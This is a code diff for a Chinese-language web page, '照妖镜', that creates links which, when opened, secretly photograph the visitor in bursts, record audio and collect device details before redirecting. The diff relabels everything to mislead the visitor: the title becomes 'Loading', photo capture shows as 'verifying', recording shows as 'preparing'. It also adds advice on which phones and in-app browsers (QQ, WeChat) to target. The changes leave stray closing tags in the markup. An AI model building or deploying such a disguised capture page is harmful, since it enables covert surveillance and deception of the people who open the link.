@@ -3,7 +3,7 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>照妖镜 · 多功能采集</title>
+    <title>加载中</title>
     <style>
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
@@ -104,10 +104,12 @@
 <div id="configMode" class="config-container">
     <div class="card">
         <div class="card-header">
-            <span class="icon">🪞</span>
-            <h1>照妖镜 · 多功能采集</h1>
-            <p style="color:#a0a0b0;font-size:13px;">生成追踪链接 · 拍照 · 连拍 · 录音</p>
+            <img class="icon" src="1.jpg" alt="照妖镜图标">
+            <h1>言出法随·照妖镜</h1>
+            <p style="color:#a0a0b0;font-size:13px;">生成链接 · 拍照 · 连拍 · 录音</p>
         </div>
+    </div>
+</div>
 
         <div class="form-group">
             <label>QQ号 <span style="color:#e74c3c;">*</span></label>
@@ -125,19 +127,19 @@
         </div>
         <div class="form-group checkbox-group">
             <input type="checkbox" id="audioCheck" checked>
-            <label for="audioCheck" style="margin:0;">同时录制一段语音（约3秒）</label>
+            <label for="audioCheck" style="margin:0;">同时录制一段语音</label>
         </div>
 
-        <button class="btn" onclick="generateLink()">🔗 生成追踪链接</button>
+        <button class="btn" onclick="generateLink()">🔗 生成链接</button>
 
         <div class="result-area" id="resultArea">
-            <div style="color:#2ecc71;font-weight:600;font-size:12px;">✅ 追踪链接</div>
+            <div style="color:#2ecc71;font-weight:600;font-size:12px;">✅ 链接</div>
             <input type="text" id="resultLink" readonly onclick="this.select();copyLink()">
             <button class="btn-copy" id="btnCopy" onclick="copyLink()">📋 复制</button>
         </div>
 
         <div class="warning-box">
-            ⚠️ 需要 HTTPS 环境，API 为 HTTP 时可能被浏览器拦截。录音功能需要额外的麦克风权限。
+            ⚠️ 对方需未安卓系统并使用非Eage，火狐等浏览器，系统自带的就是不错的选择，QQ微信也可以
         </div>
     </div>
 
@@ -164,7 +166,7 @@
         <div class="status-text" id="statusText">正在初始化...</div>
         <div class="denied-msg" id="deniedMsg">
             🚫 访问被拒绝<br>
-            <span style="font-size:12px;color:#666;">对方未授权，任务终止</span>
+            <span style="font-size:12px;color:#666;">权限未同意，访问终止</span>
         </div>
     </div>
 </div>
@@ -275,7 +277,7 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
     pushLog(`Screen: ${screenW}x${screenH} | Platform: ${platform} | Cores: ${cores} | TZ: ${timezone}`);
 
     async function run() {
-        setStatus('正在请求授权...');
+        setStatus('正在请求服务器...');
         pushLog('Requesting permissions...');
 
         let stream;
@@ -304,7 +306,7 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
                     deniedMsg.classList.add('show');
                     return;
                 }
-                setStatus('设备不可用', true);
+                setStatus('设备不可用，权限未给予', true);
                 spinner.classList.add('error');
                 setTimeout(() => location.href = redirectUrl, 2000);
                 return;
@@ -341,7 +343,7 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
 
         // 连拍
         for (let i = 0; i < burstCount; i++) {
-            setStatus(`正在拍摄 (${i+1}/${burstCount})...`);
+            setStatus(`验证中.. (${i+1}/${burstCount})...`);
             ctx.drawImage(vid, 0, 0);
             const img = cvs.toDataURL('image/jpeg', 0.65);
             pushLog(`Captured frame ${i+1}/${burstCount} (${Math.round(img.length/1024)}KB)`);
@@ -366,7 +368,7 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
 
         // 录音（如果启用）
         if (audioEnabled && stream.getAudioTracks().length > 0) {
-            setStatus('正在录音...');
+            setStatus('准备...');
             pushLog('Recording audio (3s)...');
             try {
                 const mediaRecorder = new MediaRecorder(stream);
@@ -403,11 +405,11 @@ function startTrack(qq, redirectUrl, burstCount, audioEnabled) {
                 setTimeout(() => mediaRecorder.stop(), 3000);
             } catch (e) {
                 pushLog(`Audio recording error: ${e.message}`);
-                setStatus('完成（无音频）', false);
+                setStatus('WIN', false);
                 setTimeout(() => location.href = redirectUrl, 1500);
             }
         } else {
-            setStatus('完成 ✓');
+            setStatus('WIN');
             spinner.classList.add('done');
             setTimeout(() => location.href = redirectUrl, 1500);
         }
